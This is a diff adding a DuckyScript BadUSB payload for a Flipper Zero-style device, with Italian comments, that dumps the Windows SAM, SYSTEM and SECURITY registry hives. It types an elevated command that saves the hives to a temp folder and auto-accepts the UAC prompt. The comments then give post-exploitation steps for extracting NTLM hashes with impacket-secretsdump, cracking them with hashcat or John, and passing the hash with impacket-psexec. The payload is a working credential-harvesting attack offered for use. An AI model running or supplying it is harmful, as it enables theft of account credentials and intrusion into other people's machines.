@@ -1,0 +1,41 @@
+REM ============================================================
+REM Title:    SAM/SYSTEM/SECURITY Dump
+REM Target:   Windows 10/11
+REM Author:   FlipperZero-guide
+REM Category: Credential Harvest
+REM Privs:    Admin REQUIRED
+REM Layout:   IT
+REM Time:     ~10 secondi
+REM Detect:   Alto - reg save è monitorato da EDR
+REM Desc:     Dumpa i file SAM, SYSTEM e SECURITY per
+REM           cracking offline degli hash NTLM locali.
+REM           Crack con: impacket-secretsdump -sam SAM
+REM                      -system SYSTEM -security SECURITY LOCAL
+REM ============================================================
+
+DELAY 2000
+GUI r
+DELAY 500
+STRING powershell Start-Process cmd -Verb runAs -ArgumentList '/c mkdir %TEMP%\sam_dump && reg save HKLM\SAM %TEMP%\sam_dump\SAM /y && reg save HKLM\SYSTEM %TEMP%\sam_dump\SYSTEM /y && reg save HKLM\SECURITY %TEMP%\sam_dump\SECURITY /y'
+ENTER
+DELAY 2000
+REM UAC prompt - conferma
+ALT y
+DELAY 1000
+
+REM ============================================================
+REM Post-exploitation: cracking degli hash
+REM
+REM 1. Estrai hash:
+REM    impacket-secretsdump -sam SAM -system SYSTEM LOCAL
+REM
+REM 2. Crack con hashcat:
+REM    hashcat -m 1000 hashes.txt rockyou.txt
+REM
+REM 3. Oppure con John:
+REM    john --format=NT hashes.txt --wordlist=rockyou.txt
+REM
+REM NOTA: Gli hash NTLM possono essere usati direttamente
+REM per Pass-the-Hash senza cracking:
+REM    impacket-psexec -hashes :HASH admin@TARGET
+REM ============================================================
